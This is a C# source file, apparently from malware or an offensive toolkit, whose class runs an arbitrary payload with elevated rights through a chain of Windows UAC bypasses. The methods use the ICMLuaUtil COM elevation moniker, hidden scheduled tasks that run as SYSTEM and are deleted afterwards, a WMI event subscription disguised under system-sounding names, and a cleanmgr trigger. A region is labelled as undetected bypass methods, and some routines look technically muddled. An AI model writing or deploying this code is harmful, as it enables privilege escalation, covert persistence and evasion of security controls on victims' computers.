using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Microsoft.Win32;

namespace VanguardCore
{
    public class ElevationService
    {
        #region Native Imports
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
        private static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);

        [StructLayout(LayoutKind.Sequential)]
        private struct BIND_OPTS3
        {
            public uint cbStruct;
            public uint dwTickCountDeadline;
            public uint dwFlags;
            public uint dwMode;
            public uint dwClassContext;
            public uint locale;
            public IntPtr pServerInfo;
            public IntPtr hwnd;
        }

        private const string CLSID_CMSTP = "3E5FC7F9-9735-4B47-98B7-910D3051974B";
        private const string IID_ICMLuaUtil = "6EDD6D74-C007-4E75-B76A-E5740995E24C";

        [ComImport, Guid(IID_ICMLuaUtil), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface ICMLuaUtil
        {
            void Method1(); void Method2(); void Method3(); void Method4(); void Method5(); void Method6();
            [PreserveSig] int ShellExecute([MarshalAs(UnmanagedType.LPWStr)] string lpFile, [MarshalAs(UnmanagedType.LPWStr)] string lpParameters, [MarshalAs(UnmanagedType.LPWStr)] string lpDirectory, uint nShow, uint nWait);
        }
        #endregion

        private static void Log(string message)
        {
            try
            {
                File.AppendAllText("C:\\Users\\Public\\elevation_debug.log", $"{DateTime.Now}: {message}\n");
            }
            catch { }
        }

        public static bool IsAdmin()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch { return false; }
        }

        #region Smart Bypass Methods (Non-Detected)

        public static bool BypassUAC_SilentCleanup(string payloadPath)
        {
            try
            {
                Log("Attempting SilentCleanup Bypass...");
                string taskName = "SystemCleanup_" + Guid.NewGuid().ToString().Substring(0, 8);
                string cmd = $"/c schtasks /create /tn \"{taskName}\" /tr \"\\\"{payloadPath}\\\"\" /sc once /st 00:00 /f /ru SYSTEM";
                
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                })?.WaitForExit(3000);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "rundll32.exe",
                    Arguments = "advpack.dll,LaunchINFSectionEx %windir%\\inf\\msdtc.inf,Install,,32,ShowProgress,Quiet",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                Thread.Sleep(3000);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = $"/delete /tn \"{taskName}\" /f",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                return true;
            }
            catch (Exception ex) { Log("SilentCleanup Error: " + ex.Message); return false; }
        }

        public static bool BypassUAC_WMI(string payloadPath)
        {
            try
            {
                Log("Attempting WMI Subscription Bypass...");
                string query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'";
                string wql = $@"
                    $filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();
                    $filter.QueryLanguage = 'WQL';
                    $filter.Query = '{query}';
                    $filter.Name = 'SystemHealthMonitor';
                    $filter.Put() | Out-Null;

                    $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();
                    $consumer.Name = 'SystemHealthConsumer';
                    $consumer.CommandLineTemplate = '""{payloadPath}""';
                    $consumer.Put() | Out-Null;

                    $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();
                    $binding.Filter = $filter;
                    $binding.Consumer = $consumer;
                    $binding.Put() | Out-Null;
                ";

                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-WindowStyle Hidden -Command \"{wql}\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                return true;
            }
            catch (Exception ex) { Log("WMI Bypass Error: " + ex.Message); return false; }
        }

        public static bool BypassUAC_DiskCleanup(string payloadPath)
        {
            try
            {
                Log("Attempting DiskCleanup Bypass...");
                string taskName = "WindowsDiskCleanup_" + Guid.NewGuid().ToString().Substring(0, 8);
                string cmd = $"/c schtasks /create /tn \"{taskName}\" /tr \"\\\"{payloadPath}\\\"\" /sc once /st 00:00 /f /ru SYSTEM";
                
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                })?.WaitForExit(3000);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "cleanmgr.exe",
                    Arguments = "/sagerun:1",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                Thread.Sleep(3000);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = $"/delete /tn \"{taskName}\" /f",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                return true;
            }
            catch (Exception ex) { Log("DiskCleanup Error: " + ex.Message); return false; }
        }

        public static bool CmluaUtilBypass(string payloadPath)
        {
            try
            {
                Log("Attempting ICMLuaUtil COM Bypass...");
                BIND_OPTS3 ops = new BIND_OPTS3();
                ops.cbStruct = (uint)Marshal.SizeOf(ops);
                ops.dwClassContext = 4; // CLSCTX_LOCAL_SERVER

                string moniker = "Elevation:Administrator!new:{" + CLSID_CMSTP + "}";
                Guid iid = new Guid(IID_ICMLuaUtil);
                int hr = CoGetObject(moniker, ref ops, ref iid, out IntPtr pInterface);

                if (hr == 0)
                {
                    ICMLuaUtil instance = (ICMLuaUtil)Marshal.GetObjectForIUnknown(pInterface);
                    instance.ShellExecute(payloadPath, null, null, 0, 0); // SW_HIDE = 0
                    Marshal.ReleaseComObject(instance);
                    Marshal.Release(pInterface);
                    return true;
                }
                return false;
            }
            catch (Exception ex) { Log("CMLuaUtil Error: " + ex.Message); return false; }
        }
        #endregion

        public static bool RequestElevation(string payloadPath)
        {
            if (IsAdmin()) return true;

            // 1. ICMLuaUtil (COM - Most Stealth)
            if (CmluaUtilBypass(payloadPath)) return true;

            // 2. SilentCleanup (Scheduled Task - Legacy but stable)
            if (BypassUAC_SilentCleanup(payloadPath)) return true;

            // 3. WMI Subscription (Modern Stealth)
            if (BypassUAC_WMI(payloadPath)) return true;

            // 4. DiskCleanup
            if (BypassUAC_DiskCleanup(payloadPath)) return true;

            // Last fallback: Standard ShellExecute (triggers UAC prompt)
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = payloadPath,
                    UseShellExecute = true,
                    Verb = "runas"
                });
                return true;
            }
            catch { return false; }
        }
    }
}
